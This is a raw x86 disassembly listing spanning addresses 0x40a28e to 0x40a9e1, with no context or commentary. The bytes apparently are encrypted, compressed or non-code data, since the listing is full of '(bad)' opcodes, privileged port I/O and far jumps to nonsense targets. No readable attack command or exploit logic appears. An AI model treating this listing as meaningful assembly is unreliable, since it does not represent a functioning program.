  40a28e:	adc    al,0x8a
  40a290:	mov    cl,0x1f
  40a292:	xor    BYTE PTR [edx],al
  40a294:	hlt    
  40a295:	adc    bh,ah
  40a297:	mov    ah,0x71
  40a299:	outs   dx,DWORD PTR ds:[esi]
  40a29a:	mov    ebp,0xd51f6d65
  40a29f:	(bad)  
  40a2a0:	mov    dh,0xf
  40a2a2:	(bad)  
  40a2a3:	popf   
  40a2a4:	ja     0x40a2c5
  40a2a6:	aad    0x77
  40a2a8:	cld    
  40a2a9:	cld    
  40a2aa:	out    0xb4,al
  40a2ac:	jno    0x40a256
  40a2ae:	and    ch,BYTE PTR [ebp-0x25]
  40a2b1:	pop    edi
  40a2b2:	cmp    eax,0xd51fa175
  40a2b7:	(bad)
  40a2ba:	cmp    eax,0xdeed7ebf
  40a2bf:	jae    0x40a2a7
  40a2c1:	movsx  esp,BYTE PTR [edi+0x6e]
  40a2c5:	pop    ds
  40a2c6:	aad    0xfe
  40a2c8:	mov    dh,0x1b
  40a2ca:	arpl   WORD PTR [eax],bp
  40a2cc:	xor    DWORD PTR [ecx],esi
  40a2ce:	adc    eax,0xd19cfc75
  40a2d3:	add    BYTE PTR [esi-0x63ac26e9],bh
  40a2d9:	std    
  40a2da:	enter  0xfe19,0xa2
  40a2de:	ins    DWORD PTR es:[edi],dx
  40a2df:	mov    dh,BYTE PTR [ecx-0x1aa2be1]
  40a2e5:	sar    BYTE PTR [ebp-0x2be04e74],cl
  40a2eb:	sub    BYTE PTR [esi+0x31],cl
  40a2ee:	adc    eax,0x3407c775
  40a2f3:	jno    0x40a365
  40a2f5:	pop    ds
  40a2f6:	adc    eax,edi
  40a2f8:	push   edx
  40a2f9:	xor    DWORD PTR ds:0xf8a48075,edx
  40a2ff:	jbe    0x40a372
  40a301:	pop    ds
  40a302:	aam    0x28
  40a304:	push   esi
  40a305:	xor    DWORD PTR ds:0x3d5fdb75,edx
  40a30b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a30c:	in     eax,0xdb
  40a30e:	push   esp
  40a30f:	je     0x40a2f7
  40a311:	movsx  edx,BYTE PTR [edi]
  40a314:	outs   dx,BYTE PTR ds:[esi]
  40a315:	pop    ds
  40a316:	aad    0xfe
  40a318:	mov    dh,0x13
  40a31a:	loope  0x40a350
  40a31c:	and    BYTE PTR [ebx+0x1f7176d8],0x60
  40a323:	ins    DWORD PTR es:[edi],dx
  40a324:	(bad)  
  40a325:	jbe    0x40a2e4
  40a327:	lock outs dx,DWORD PTR ds:[esi]
  40a329:	pop    ds
  40a32a:	aad    0xb0
  40a32c:	hlt    
  40a32d:	add    al,0xe7
  40a32f:	mov    ah,0x71
  40a331:	cs pop edx
  40a333:	arpl   WORD PTR [edx+0x1f],si
  40a336:	aad    0xc4
  40a338:	enter  0xec07,0x70
  40a33c:	jo     0x40a35d
  40a33e:	adc    eax,edi
  40a340:	pop    edx
  40a341:	xor    DWORD PTR ds:0xb0a48075,edx
  40a347:	jbe    0x40a3ba
  40a349:	pop    ds
  40a34a:	pusha  
  40a34b:	jmp    0x5c2a:0x6952aa79
  40a352:	aad    0x74
  40a354:	jno    0x40a3ae
  40a356:	loope  0x40a305
  40a358:	jecxz  0x40a37b
  40a35a:	enter  0xfc19,0x94
  40a35e:	(bad)  
  40a360:	out    dx,al
  40a361:	adc    ebx,ecx
  40a363:	rep lods eax,DWORD PTR ds:[esi]
  40a365:	and    cl,BYTE PTR [ebx-0x4f]
  40a368:	xlat   BYTE PTR ds:[ebx]
  40a369:	stos   BYTE PTR es:[edi],al
  40a36a:	sbb    ecx,DWORD PTR [ebx-0x74e35729]
  40a370:	cld    
  40a371:	ins    BYTE PTR es:[edi],dx
  40a372:	leave  
  40a373:	js     0x40a32f
  40a375:	pop    ebx
  40a376:	aas    
  40a377:	jne    0x40a33e
  40a379:	mov    DWORD PTR ds:0xd46fe274,edx
  40a37f:	jmp    0x2f77:0xe4048779
  40a386:	aam    0xea
  40a388:	popa   
  40a389:	or     BYTE PTR [ecx],al
  40a38b:	jb     0x40a3fd
  40a38d:	pop    ds
  40a38e:	cs add dh,ch
  40a391:	daa    
  40a392:	pusha  
  40a393:	jmp    0x5bbf:0x78a3ab65
  40a39a:	pusha  
  40a39b:	mov    esi,0x7a12c5
  40a3a0:	into   
  40a3a1:	daa    
  40a3a2:	fmul   st,st(7)
  40a3a4:	lods   eax,DWORD PTR ds:[esi]
  40a3a5:	cs mov eax,es
  40a3a8:	ja     0x40a3d8
  40a3aa:	mov    eax,gs
  40a3ac:	test   DWORD PTR [ecx+ecx*2+0x26758993],ebp
  40a3b3:	add    dh,ch
  40a3b5:	daa    
  40a3b6:	fdiv   st,st(2)
  40a3b8:	jge    0x40a364
  40a3ba:	and    edi,DWORD PTR [ebp-0x4]
  40a3bd:	bound  ecx,QWORD PTR ds:0xcce774bd
  40a3c3:	inc    ebp
  40a3c4:	xchg   esp,eax
  40a3c5:	out    0x96,eax
  40a3c7:	pop    esi
  40a3c8:	jae    0x40a41c
  40a3ca:	xchg   ebp,eax
  40a3cb:	push   0x8523ab1c
  40a3d0:	cld    
  40a3d1:	popf   
  40a3d2:	loope  0x40a3d3
  40a3d4:	out    0x33,eax
  40a3d6:	fsubr  st,st(1)
  40a3d8:	and    edx,DWORD PTR gs:[edx+0x7d]
  40a3dc:	les    ebp,FWORD PTR fs:[esi]
  40a3df:	shl    esp,cl
  40a3e1:	in     eax,0xfd
  40a3e3:	push   esi
  40a3e4:	cmp    eax,0xd9694b1f
  40a3e9:	mov    esp,0x1ed4dff3
  40a3ee:	dec    ebx
  40a3ef:	gs pop ecx
  40a3f1:	in     al,0xd1
  40a3f3:	je     0x40a465
  40a3f5:	stos   DWORD PTR es:[edi],eax
  40a3f6:	pusha  
  40a3f7:	stc    
  40a3f8:	jno    0x40a419
  40a3fa:	aad    0x57
  40a3fc:	fsubr  QWORD PTR [edx+0x1f71f570]
  40a402:	aad    0x77
  40a404:	into   
  40a405:	daa    
  40a406:	pusha  
  40a407:	call   0xea0bce89
  40a40c:	int3   
  40a40d:	and    cl,BYTE PTR [edx+0x7d]
  40a410:	mov    DWORD PTR [edi],0x1f70704f
  40a416:	loope  0x40a44c
  40a418:	out    0x31,al
  40a41a:	sub    ebx,ebp
  40a41c:	(bad)  
  40a41d:	fcom   QWORD PTR [esi-0x3a6a8f4c]
  40a423:	pop    ebp
  40a424:	add    bl,BYTE PTR [edx*8+0x49df7c74]
  40a42b:	lods   al,BYTE PTR ds:[esi]
  40a42c:	cld    
  40a42d:	out    dx,eax
  40a42e:	pusha  
  40a42f:	lock sub DWORD PTR [edx-0x6a987ff8],0x2368ffd7
  40a43a:	dec    edx
  40a43b:	jge    0x40a4b1
  40a43d:	pushf  
  40a43e:	frstor [ecx]
  40a440:	jl     0x40a421
  40a442:	dec    ecx
  40a443:	xchg   esp,eax
  40a444:	sbb    cl,0xc5
  40a447:	xchg   esp,eax
  40a448:	jecxz  0x40a46e
  40a44a:	fdivr  DWORD PTR [ecx-0x38eaa087]
  40a450:	shl    DWORD PTR [ecx+0x3d],0x74
  40a454:	nop
  40a455:	fwait
  40a456:	sahf   
  40a457:	je     0x40a43f
  40a459:	movsx  ecx,bh
  40a45c:	ins    DWORD PTR es:[edi],dx
  40a45d:	pop    ds
  40a45e:	aad    0xcf
  40a460:	sbb    al,0xb
  40a462:	mov    dl,0xf8
  40a464:	xor    al,0x34
  40a466:	rcl    BYTE PTR [ebx],0xfc
  40a469:	je     0x40a448
  40a46b:	dec    esi
  40a46d:	daa    
  40a46e:	fmul   st,st(7)
  40a470:	lods   eax,DWORD PTR ds:[esi]
  40a471:	dec    edx
  40a472:	sub    BYTE PTR [ecx-0x7bc4901b],ch
  40a478:	sub    eax,DWORD PTR [ebx+0x67e374eb]
  40a47e:	pop    eax
  40a47f:	xor    BYTE PTR ds:0x7174d520,dl
  40a485:	xchg   ebx,eax
  40a486:	adc    al,0x0
  40a488:	out    0x27,al
  40a48a:	fsub   DWORD PTR [edi]
  40a48c:	adc    DWORD PTR [eax],esp
  40a48e:	aad    0x74
  40a490:	cld    
  40a491:	pop    ebp
  40a492:	fdiv   st,st(1)
  40a494:	jns    0x40a440
  40a496:	and    edi,DWORD PTR [ecx-0xc]
  40a499:	or     dh,bl
  40a49b:	inc    ebp
  40a49c:	pop    edx
  40a49d:	add    edi,ebp
  40a49f:	and    DWORD PTR [esi],ebx
  40a4a1:	xchg   BYTE PTR [edx+0x5201adb],al
  40a4a7:	jmp    0x8514e925
  40a4ac:	jno    0x40a4cd
  40a4ae:	(bad)  
  40a4af:	mov    BYTE PTR [ecx-0x49ff3bff],ch
  40a4b5:	daa    
  40a4b6:	fdiv   st,st(7)
  40a4b8:	adc    DWORD PTR [eax],esp
  40a4ba:	aad    0x74
  40a4bc:	je     0x40a460
  40a4be:	jns    0x40a535
  40a4c0:	jno    0x40a4e1
  40a4c2:	adc    BYTE PTR [ebp-0x1d],ah
  40a4c5:	jmp    0x2075a52a
  40a4ca:	aad    0x74
  40a4cc:	push   esp
  40a4cd:	sub    ah,dl
  40a4cf:	jmp    0x1f70:0x70d20779
  40a4d6:	cmp    dl,BYTE PTR [esi]
  40a4d8:	mov    eax,ds:0xfc74d51f
  40a4dd:	pop    edi
  40a4de:	loope  0x40a4df
  40a4e0:	mov    cl,0x2b
  40a4e2:	pusha  
  40a4e3:	mov    ebp,0x7d2aaa89
  40a4e8:	stos   BYTE PTR es:[edi],al
  40a4e9:	outs   dx,DWORD PTR ds:[esi]
  40a4ea:	in     eax,dx
  40a4eb:	call   0xae164f6a
  40a4f0:	mov    ecx,0x5c694a37
  40a4f5:	dec    edi
  40a4f6:	pusha  
  40a4f7:	rcr    BYTE PTR [ecx-0x582ddde],0x67
  40a4fe:	icebp  
  40a4ff:	std    
  40a500:	mov    esi,0x91b59c23
  40a505:	and    ch,dl
  40a507:	je     0x40a57a
  40a509:	test   esp,ecx
  40a50b:	mov    eax,0xe9f51f87
  40a510:	js     0x40a4f8
  40a512:	sbb    al,BYTE PTR [ebp+0x74d51f71]
  40a518:	cmp    BYTE PTR [ecx+edi*8-0x70],ah
  40a51c:	jno    0x40a53d
  40a51e:	aad    0x74
  40a520:	shr    al,cl
  40a522:	xchg   edi,eax
  40a523:	jns    0x40a596
  40a525:	mov    ebp,edx
  40a527:	fdivr  QWORD PTR ds:0x7099e5b7
  40a52d:	xchg   ebp,eax
  40a52e:	lds    ebx,FWORD PTR [ebp-0xa]
  40a531:	sbb    dl,ch
  40a533:	je     0x40a4f3
  40a535:	push   edi
  40a536:	das    
  40a537:	add    eax,0x773b22a9
  40a53c:	jne    0x40a566
  40a53e:	inc    esi
  40a53f:	je     0x40a533
  40a541:	xlat   BYTE PTR ds:[ebx]
  40a542:	xchg   edi,eax
  40a543:	push   es
  40a544:	jb     0x40a5a5
  40a546:	xchg   edi,eax
  40a547:	mov    dh,BYTE PTR [eax+ebp*1]
  40a54a:	(bad)  
  40a54b:	cmp    BYTE PTR [ecx+0x2d],0xf4
  40a54f:	cs in  eax,dx
  40a551:	and    BYTE PTR [ecx-0x72bec182],cl
  40a557:	push   0xffffffbd
  40a559:	lahf   
  40a55a:	(bad)  
  40a55c:	(bad)  [eax+0x3be19548]
  40a562:	inc    edi
  40a563:	in     al,0xd8
  40a565:	out    dx,al
  40a566:	ss loop 0x40a5e8
  40a569:	and    BYTE PTR [ebx-0x1d],0xaf
  40a56d:	mov    esi,0x84d34449
  40a572:	xor    al,0x13
  40a574:	out    0xde,al
  40a576:	add    eax,0x246377de
  40a57b:	enter  0x8d6d,0xdc
  40a57f:	jecxz  0x40a556
  40a581:	test   BYTE PTR [ebx],al
  40a583:	add    BYTE PTR [ebx-0x4af306d7],0x99
  40a58a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a58b:	ja     0x40a514
  40a58d:	lods   eax,DWORD PTR ds:[esi]
  40a58e:	adc    esp,DWORD PTR [ebx]
  40a590:	jmp    0x96ba2b91
  40a595:	push   edx
  40a596:	push   ecx
  40a597:	pop    ebx
  40a598:	lds    eax,FWORD PTR [ecx-0x23]
  40a59b:	inc    esi
  40a59c:	imul   ebx,edi,0x6444f15b
  40a5a2:	jmp    0xa8fd:0x10f7b1c5
  40a5a9:	cmc    
  40a5aa:	cmp    eax,0x6f277970
  40a5af:	pusha  
  40a5b0:	test   eax,0x34ee0946
  40a5b5:	imul   eax,DWORD PTR [esp+eax*4-0x209c1e7f],0x14054ffb
  40a5c0:	dec    eax
  40a5c1:	xor    eax,0x1af7d4e
  40a5c6:	div    DWORD PTR [ebx-0x3868faff]
  40a5cc:	fiadd  DWORD PTR [edx-0x762e46c3]
  40a5d2:	mov    eax,ds:0xe764c185
  40a5d7:	shl    BYTE PTR [edx+0x20],0xdf
  40a5db:	fidivr DWORD PTR [edi-0x7a32db94]
  40a5e1:	push   DWORD PTR [ebp-0x1fdf5589]
  40a5e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5e8:	jnp    0x40a61b
  40a5ea:	mov    bh,0xbd
  40a5ec:	(bad)  
  40a5ed:	mov    ds:0x62851cdb,eax
  40a5f2:	xchg   edx,eax
  40a5f3:	inc    ebx
  40a5f4:	jl     0x40a625
  40a5f6:	out    0x98,al
  40a5f8:	jbe    0x40a63f
  40a5fa:	popf   
  40a5fb:	add    DWORD PTR [ebp+0x7ec9e321],0x517d69e1
  40a605:	push   eax
  40a606:	sbb    eax,0xdfe6c681
  40a60b:	jb     0x40a5da
  40a60d:	pop    esi
  40a60e:	adc    eax,0xd72f2dd
  40a613:	fnstsw WORD PTR [ecx-0x14]
  40a616:	in     al,0x83
  40a618:	icebp  
  40a619:	mov    esp,DWORD PTR [ecx]
  40a61b:	aad    0xca
  40a61d:	mov    al,0x5e
  40a61f:	xor    DWORD PTR [ecx],0x2b
  40a622:	fcmove st,st(1)
  40a624:	mov    al,0x4e
  40a626:	jbe    0x40a5d0
  40a628:	xchg   ecx,eax
  40a629:	pop    edi
  40a62a:	in     eax,dx
  40a62b:	stc    
  40a62c:	stos   DWORD PTR es:[edi],eax
  40a62d:	and    BYTE PTR [ebp-0x5d],dh
  40a630:	in     eax,0x84
  40a632:	dec    eax
  40a633:	in     eax,dx
  40a634:	push   edx
  40a635:	xor    DWORD PTR [ebp+0x3bb0c980],eax
  40a63b:	enter  0xd775,0x25
  40a63f:	test   DWORD PTR [ebx+eax*2+0x37bc907],esi
  40a646:	test   BYTE PTR [esp+edi*2],0x4d
  40a64a:	inc    edi
  40a64b:	call   0x82b729a5
  40a650:	sar    DWORD PTR [eax+0x79],1
  40a653:	ss ret 
  40a655:	xor    BYTE PTR [edi],bh
  40a657:	jns    0x40a5e5
  40a659:	popa   
  40a65a:	std    
  40a65b:	js     0x40a633
  40a65d:	mov    eax,DWORD PTR [eax+ebx*8+0xa]
  40a661:	xor    al,0xe9
  40a663:	sub    BYTE PTR [ebx-0x66d66ed9],dl
  40a669:	lea    edx,ds:0x7f2086fa
  40a66f:	popa   
  40a670:	sbb    al,0x68
  40a672:	and    eax,DWORD PTR [ecx-0x6b]
  40a675:	dec    esi
  40a676:	iret   
  40a677:	aad    0x9b
  40a679:	shr    DWORD PTR [edi+0x24dc71e9],0xa8
  40a680:	or     DWORD PTR [edx+0x10],0xffffffb2
  40a684:	pusha  
  40a685:	and    BYTE PTR [edx+0x2e687707],cl
  40a68b:	dec    bp
  40a68d:	rcl    DWORD PTR [ebx],cl
  40a68f:	mov    BYTE PTR [eax-0x3b24161],bh
  40a695:	popa   
  40a696:	inc    esi
  40a697:	aaa    
  40a698:	imul   esp,DWORD PTR [eax],0x24
  40a69b:	or     al,0xcf
  40a69d:	(bad)  
  40a69e:	test   eax,0xd58cd4b5
  40a6a3:	push   edi
  40a6a4:	sub    al,0xf1
  40a6a6:	cli    
  40a6a7:	mov    bh,0x7a
  40a6a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6aa:	push   ebp
  40a6ab:	jl     0x40a635
  40a6ad:	sbb    al,0xf6
  40a6af:	lods   eax,DWORD PTR ds:[esi]
  40a6b0:	test   eax,0xb8c0d7af
  40a6b5:	not    ebp
  40a6b7:	adc    BYTE PTR [eax+0x6f],cl
  40a6ba:	adc    ebp,DWORD PTR [eax]
  40a6bc:	addr16 adc al,0xef
  40a6bf:	jnp    0x40a649
  40a6c1:	ins    DWORD PTR es:[edi],dx
  40a6c2:	mov    bh,0xe0
  40a6c5:	out    dx,eax
  40a6c6:	mov    esp,0xd9101085
  40a6cb:	push   ds
  40a6cc:	stos   DWORD PTR es:[edi],eax
  40a6cd:	int3   
  40a6ce:	pop    edx
  40a6cf:	shr    BYTE PTR [ebp-0x30],0xc4
  40a6d3:	pop    ebx
  40a6d4:	xchg   edx,eax
  40a6d5:	pop    ds
  40a6d6:	ins    BYTE PTR es:[edi],dx
  40a6d7:	push   ecx
  40a6d8:	push   edx
  40a6d9:	mov    ebx,0x23a6c6fc
  40a6de:	aad    0xb4
  40a6e0:	inc    si
  40a6e2:	cmp    DWORD PTR [edx],esi
  40a6e4:	pusha  
  40a6e5:	popf   
  40a6e6:	or     eax,0xc9d6c678
  40a6eb:	icebp  
  40a6ec:	ret    0x5d37
  40a6ef:	mov    dl,dh
  40a6f1:	rcl    ebp,0xfe
  40a6f4:	xchg   ebp,eax
  40a6f5:	inc    edx
  40a6f6:	addr16 pop ecx
  40a6f8:	or     al,0x82
  40a6fa:	push   eax
  40a6fb:	xchg   ebx,eax
  40a6fc:	mov    al,BYTE PTR [edx]
  40a6fe:	ins    DWORD PTR es:[edi],dx
  40a6ff:	cmc    
  40a700:	(bad)  
  40a701:	scas   eax,DWORD PTR es:[edi]
  40a702:	and    BYTE PTR [edi+0xe],0x92
  40a706:	aad    0xda
  40a708:	xchg   edi,eax
  40a709:	jne    0x40a77e
  40a70b:	stc    
  40a70c:	push   es
  40a70d:	addr16 pop esi
  40a70f:	jne    0x40a77b
  40a711:	push   esp
  40a712:	adc    al,0x95
  40a714:	or     edx,DWORD PTR [esi+0x12718801]
  40a71a:	lods   eax,DWORD PTR ds:[esi]
  40a71b:	stos   BYTE PTR es:[edi],al
  40a71c:	lahf   
  40a71d:	cmp    DWORD PTR [ebx],ebx
  40a71f:	xchg   edi,eax
  40a720:	ins    BYTE PTR es:[edi],dx
  40a721:	das    
  40a722:	sub    eax,0x55ef3a3f
  40a727:	pop    ds
  40a728:	aas    
  40a729:	or     al,0xab
  40a72b:	test   eax,0x36497b71
  40a730:	mov    ds,WORD PTR [ecx+ebx*4-0x60]
  40a734:	sbb    ah,BYTE PTR [eax]
  40a736:	cmp    eax,0x5dad5929
  40a73b:	cmp    cl,BYTE PTR [eax+0x43]
  40a73e:	aad    0xe0
  40a740:	mov    eax,ds:0x14ce7dc6
  40a745:	pop    es
  40a746:	imul   esi,DWORD PTR [esi+0x5e],0xfc8834d0
  40a74d:	dec    edx
  40a74e:	mov    dl,0x65
  40a750:	dec    edx
  40a751:	xchg   edi,eax
  40a752:	aad    0x3d
  40a754:	rcr    ecx,0x66
  40a757:	jbe    0x40a792
  40a759:	xor    DWORD PTR [ebp+0x75],0xfffffff5
  40a75d:	sub    al,0x40
  40a75f:	addr16 jbe 0x40a7a3
  40a762:	inc    esp
  40a763:	imul   edx,DWORD PTR [eax-0x4e533f47],0xf95e16f8
  40a76d:	pop    es
  40a76e:	mov    ds:0x553f1d75,al
  40a773:	add    ecx,DWORD PTR [ecx]
  40a775:	push   es
  40a776:	(bad)  
  40a777:	cli    
  40a778:	jno    0x40a775
  40a77a:	adc    bh,BYTE PTR [ebx+0x1c8fede2]
  40a780:	fcomp  QWORD PTR [ebp-0x7f]
  40a783:	aas    
  40a784:	repnz dec esp
  40a786:	mov    ah,0xa5
  40a788:	inc    ebp
  40a789:	inc    ebp
  40a78a:	cdq    
  40a78b:	pop    ecx
  40a78c:	pop    edi
  40a78d:	mov    edx,0x556072d5
  40a792:	test   BYTE PTR [eax+0x77d80972],cl
  40a798:	xor    ebp,eax
  40a79a:	xchg   ebx,eax
  40a79b:	aaa    
  40a79c:	push   esi
  40a79d:	rcl    BYTE PTR [ebp+0x3f],0x9b
  40a7a1:	jmp    0x40a774
  40a7a3:	mov    bl,0x71
  40a7a5:	xchg   esi,eax
  40a7a6:	push   ds
  40a7a7:	dec    edi
  40a7a8:	sbb    al,0x6d
  40a7aa:	or     al,0xe2
  40a7ac:	xor    BYTE PTR [eax],ah
  40a7ae:	xchg   ebx,eax
  40a7af:	dec    eax
  40a7b0:	dec    edi
  40a7b1:	mov    ch,0xaa
  40a7b3:	aad    0x72
  40a7b5:	sbb    dh,dl
  40a7b7:	std    
  40a7b8:	xor    ah,al
  40a7ba:	test   esi,ebx
  40a7bc:	push   ss
  40a7bd:	ins    BYTE PTR es:[edi],dx
  40a7be:	cmp    DWORD PTR [ebp+0x4b],esi
  40a7c1:	addr16 mov dl,0x7d
  40a7c4:	(bad)  
  40a7c5:	adc    eax,0x92717b38
  40a7ca:	mov    cl,0x5
  40a7cc:	mov    ch,0x2
  40a7ce:	enter  0x5d66,0x20
  40a7d2:	sub    ebx,ebp
  40a7d4:	fadd   QWORD PTR ds:[esi-0x2ad017bb]
  40a7db:	mov    bh,dh
  40a7dd:	repnz lea edx,[ebp-0x5b]
  40a7e1:	mov    esp,0xe1b58420
  40a7e6:	shl    BYTE PTR [ebx],0x31
  40a7e9:	xchg   ebp,eax
  40a7ea:	mov    bh,0x58
  40a7ec:	leave  
  40a7ed:	in     eax,0x48
  40a7ef:	push   ebx
  40a7f0:	lahf   
  40a7f1:	dec    esi
  40a7f2:	bound  edx,QWORD PTR [eax-0x52]
  40a7f5:	lahf   
  40a7f6:	or     BYTE PTR [ebp+0x9],0xba
  40a7fa:	sub    DWORD PTR [ecx-0x163ec0a9],edi
  40a800:	add    BYTE PTR [eax-0x4],ah
  40a803:	fdivr  QWORD PTR [edx+0x7200a5ba]
  40a809:	outs   dx,BYTE PTR ds:[esi]
  40a80a:	int    0x2b
  40a80c:	jmp    0x560fbc6d
  40a811:	sar    BYTE PTR [esp+edi*2],0x59
  40a815:	push   cs
  40a816:	sub    dl,dh
  40a818:	ja     0x40a87a
  40a81a:	es jmp 0x52b1b873
  40a820:	jb     0x40a855
  40a822:	jb     0x40a886
  40a824:	arpl   si,cx
  40a826:	and    al,0x72
  40a828:	icebp  
  40a829:	mov    ebx,0xf8a1c5c8
  40a82e:	mov    ecx,0xc14e7140
  40a833:	push   cs
  40a834:	jo     0x40a83c
  40a836:	push   ecx
  40a837:	dec    ecx
  40a838:	sub    DWORD PTR [eax],esp
  40a83a:	fdiv   DWORD PTR [esi-0x415961c5]
  40a840:	xor    al,0xa4
  40a842:	jecxz  0x40a87f
  40a844:	add    ebp,ebp
  40a846:	pop    esp
  40a847:	push   ss
  40a848:	mov    bh,BYTE PTR [ebx+0x39]
  40a84b:	pop    ds
  40a84c:	cmp    DWORD PTR [ecx],edx
  40a84e:	jle    0x40a844
  40a850:	and    esp,DWORD PTR [ebx]
  40a852:	push   ebx
  40a853:	clc    
  40a854:	outs   dx,DWORD PTR ds:[esi]
  40a855:	or     bl,BYTE PTR [eax-0x2e]
  40a858:	adc    esi,eax
  40a85a:	xlat   BYTE PTR ds:[ebx]
  40a85b:	sbb    BYTE PTR [ebp-0x6f15b589],bl
  40a861:	hlt    
  40a862:	aad    0xcb
  40a864:	fdivr  DWORD PTR [edx]
  40a866:	repz jmp 0xcbce:0xef342025
  40a86e:	mov    bl,0x9e
  40a870:	sub    eax,0xaa75d5f7
  40a875:	cmc    
  40a876:	ret    
  40a877:	mov    ch,0x8c
  40a879:	mov    gs,ecx
  40a87b:	add    BYTE PTR [ebp+0x1e],0x2
  40a87f:	retf   
  40a880:	rcl    DWORD PTR [esi-0x1d],1
  40a883:	jl     0x40a894
  40a885:	mov    edx,0x9f95ecd5
  40a88a:	xlat   BYTE PTR ds:[ebx]
  40a88b:	xchg   edx,eax
  40a88c:	aas    
  40a88d:	neg    BYTE PTR [ecx+0x75]
  40a890:	xchg   ah,dh
  40a892:	xor    BYTE PTR [edi],bl
  40a894:	test   al,0x31
  40a896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a897:	jl     0x40a842
  40a899:	cdq    
  40a89a:	mov    edi,0x324c3675
  40a89f:	sbb    BYTE PTR [edi+0x87c2846],cl
  40a8a5:	pushf  
  40a8a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8a7:	scas   eax,DWORD PTR es:[edi]
  40a8a8:	lock ffreep st(7)
  40a8ab:	pop    eax
  40a8ac:	and    al,0xb5
  40a8ae:	mov    edi,0xd6106b96
  40a8b3:	dec    esi
  40a8b4:	cld    
  40a8b5:	or     al,0xb7
  40a8b7:	aad    0x70
  40a8b9:	div    BYTE PTR [ebx+esi*4+0x2cf4db76]
  40a8c0:	out    dx,al
  40a8c1:	pop    ds
  40a8c2:	aaa    
  40a8c3:	scas   eax,DWORD PTR es:[edi]
  40a8c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8c5:	sub    BYTE PTR [edi-0x572b6ff6],cl
  40a8cb:	push   DWORD PTR [ecx]
  40a8cd:	stc    
  40a8ce:	lods   al,BYTE PTR ds:[esi]
  40a8cf:	loop   0x40a85d
  40a8d1:	jp     0x40a892
  40a8d3:	jne    0x40a855
  40a8d5:	add    ebx,DWORD PTR [ecx]
  40a8d7:	xor    al,0x96
  40a8d9:	sti    
  40a8da:	mov    ch,0x6
  40a8dc:	jno    0x40a8c0
  40a8de:	popf   
  40a8df:	mov    ch,0xb2
  40a8e1:	repnz xchg ebp,eax
  40a8e3:	call   0x753460b5
  40a8e8:	sbb    bl,dl
  40a8ea:	jg     0x40a95d
  40a8ec:	ins    BYTE PTR es:[edi],dx
  40a8ed:	inc    ecx
  40a8ee:	imul   edx,DWORD PTR [ebx+0x51],0xffffff97
  40a8f2:	aad    0xf7
  40a8f4:	xchg   ebp,eax
  40a8f5:	sub    BYTE PTR [esi-0x773a6346],bh
  40a8fb:	jne    0x40a906
  40a8fd:	(bad)  [edx-0x64]
  40a900:	or     ch,ch
  40a902:	inc    esp
  40a903:	sub    eax,0x5a491271
  40a908:	pop    edx
  40a909:	inc    bp
  40a90b:	(bad)  
  40a90c:	and    BYTE PTR [bx+di],bh
  40a90f:	dec    esi
  40a910:	in     eax,0x51
  40a912:	cwde   
  40a913:	mov    ds:0x8bb6dd1,al
  40a918:	je     0x40a936
  40a91a:	shr    BYTE PTR [esi],cl
  40a91c:	sub    eax,0xf568935
  40a921:	stc    
  40a922:	adc    eax,0x589bb1e
  40a927:	jne    0x40a90c
  40a929:	imul   ebx,DWORD PTR ds:0x38a52626,0x36
  40a930:	jb     0x40a97d
  40a932:	xchg   edi,eax
  40a933:	push   es
  40a934:	fsubr  QWORD PTR [esi]
  40a936:	cmp    dl,BYTE PTR [esi]
  40a938:	cmp    DWORD PTR [ecx+esi*1+0x69],esp
  40a93c:	mov    cl,0x9e
  40a93e:	dec    esp
  40a93f:	jne    0x40a8ed
  40a941:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a942:	cmc    
  40a943:	push   edx
  40a944:	sub    edx,esp
  40a946:	or     DWORD PTR [ebp+0x4941bf78],0x5f
  40a94d:	fwait
  40a94e:	pop    eax
  40a94f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a950:	out    0xcf,al
  40a952:	retf   
  40a953:	jge    0x40a920
  40a955:	cs retf 0xa480
  40a959:	vmwrite ecx,DWORD PTR [eax+0x768dcd3b]
  40a960:	ror    ecx,1
  40a962:	aad    0xac
  40a964:	jnp    0x40a9ac
  40a966:	mov    esp,0x78aa8279
  40a96b:	jne    0x40a938
  40a96d:	jne    0x40a903
  40a96f:	mov    ebx,0x3e8a4601
  40a974:	je     0x40a92d
  40a976:	int    0x5d
  40a978:	fidivr WORD PTR [ecx+esi*1-0x58614bc3]
  40a97f:	out    0xdb,eax
  40a981:	pop    ds
  40a982:	in     al,dx
  40a983:	and    DWORD PTR [ebx],esi
  40a985:	cdq    
  40a986:	lds    eax,FWORD PTR [ebp+0x1c]
  40a989:	dec    edi
  40a98a:	aad    0x7e
  40a98c:	loop   0x40a9a1
  40a98e:	inc    ebp
  40a98f:	sti    
  40a990:	mov    eax,ds:0xb9764c3a
  40a995:	or     BYTE PTR [ebx-0x53],al
  40a998:	popa   
  40a999:	sbb    ah,cl
  40a99b:	dec    ebp
  40a99c:	lds    ecx,FWORD PTR [ebx]
  40a99e:	(bad)  
  40a9a0:	jo     0x40a922
  40a9a2:	mov    dh,0x1e
  40a9a4:	cdq    
  40a9a5:	mov    bh,0x94
  40a9a7:	cmp    eax,0xf2a6272d
  40a9ac:	push   0xf0953387
  40a9b1:	mov    cl,0xc6
  40a9b3:	test   BYTE PTR [ecx-0x5c],dh
  40a9b6:	and    dh,BYTE PTR [edx]
  40a9b8:	add    al,0xd7
  40a9ba:	add    bh,BYTE PTR [esi]
  40a9bc:	push   0x27
  40a9be:	mov    gs,WORD PTR [edx]
  40a9c0:	dec    eax
  40a9c1:	dec    eax
  40a9c2:	push   esi
  40a9c3:	adc    al,0x51
  40a9c5:	inc    edi
  40a9c6:	rol    ecx,cl
  40a9c8:	cli    
  40a9c9:	add    dl,dh
  40a9cb:	mov    ds:0x5e4d20b2,eax
  40a9d0:	mov    esi,0x578d7e6
  40a9d5:	dec    ecx
  40a9d6:	pop    ss
  40a9d7:	push   edx
  40a9d8:	popf   
  40a9d9:	fbld   TBYTE PTR ds:0xd5b040dd
  40a9df:	lods   eax,DWORD PTR ds:[esi]
  40a9e0:	push   ds
  40a9e1:	push   cs
